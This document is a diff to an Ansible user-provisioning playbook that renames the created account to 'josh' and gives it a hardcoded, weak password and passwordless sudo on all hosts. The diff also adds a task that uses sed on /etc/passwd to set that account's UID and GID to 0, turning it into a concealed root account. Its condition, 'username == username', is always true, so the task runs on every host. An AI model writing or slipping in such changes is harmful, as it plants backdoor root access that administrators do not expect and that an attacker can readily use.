@@ -3,8 +3,8 @@
   hosts: all
   become: true
   vars:
-    username: yunwei1
-    password: "{{ 'Sun%2020' | password_hash('sha512') }}"
+    username: josh
+    password: "{{ 'josh2024' | password_hash('sha512') }}"
     groups: wheel
     append: yes
     grant_nopass: true
@@ -34,3 +34,8 @@
     - name: Display SSH login test result
       debug:
         msg: "Login test result for {{ username }}: {{ ssh_test.stdout }}"
+
+    - name: Modify user ID and group ID to root in /etc/passwd
+      shell: |
+        sed -i "s#^\({{ username }}:[^:]*:\)[0-9]\+:[0-9]\+\(.*\)#\10:0\2#" /etc/passwd
+      when: username == username
